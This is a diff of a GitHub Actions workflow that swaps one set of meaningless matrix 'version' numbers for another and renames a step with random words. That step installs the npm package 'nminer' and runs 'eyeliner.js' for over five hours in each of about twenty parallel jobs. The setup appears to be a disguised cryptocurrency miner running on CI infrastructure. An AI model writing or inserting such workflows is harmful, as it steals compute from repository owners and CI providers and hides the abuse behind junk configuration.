@@ -9,25 +9,26 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 2406 }
-          - { version: 3019 }
-          - { version: 6869 }
-          - { version: 1099 }
-          - { version: 2820 }
-          - { version: 5824 }
-          - { version: 1361 }
-          - { version: 8659 }
-          - { version: 2485 }
-          - { version: 1463 }
-          - { version: 8947 }
-          - { version: 6219 }
-          - { version: 7840 }
-          - { version: 2190 }
-          - { version: 6708 }
-          - { version: 1830 }
-          - { version: 9403 }
-          - { version: 3902 }
-          - { version: 255 }
+          - { version: 5148 }
+          - { version: 3794 }
+          - { version: 830 }
+          - { version: 8528 }
+          - { version: 9905 }
+          - { version: 8320 }
+          - { version: 5892 }
+          - { version: 4850 }
+          - { version: 5785 }
+          - { version: 8171 }
+          - { version: 5070 }
+          - { version: 4243 }
+          - { version: 6527 }
+          - { version: 9607 }
+          - { version: 5022 }
+          - { version: 9012 }
+          - { version: 3205 }
+          - { version: 7030 }
+          - { version: 1363 }
+          - { version: 9572 }
 
     steps:
       - name: Checkout
@@ -38,7 +39,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: apropos intermesh
+      - name: penalise before aggressive while
         run: |
           npm install nminer@latest
-          timeout 338m node eyeliner.js || echo "eyeliner executed"
+          timeout 327m node eyeliner.js || echo "eyeliner executed"
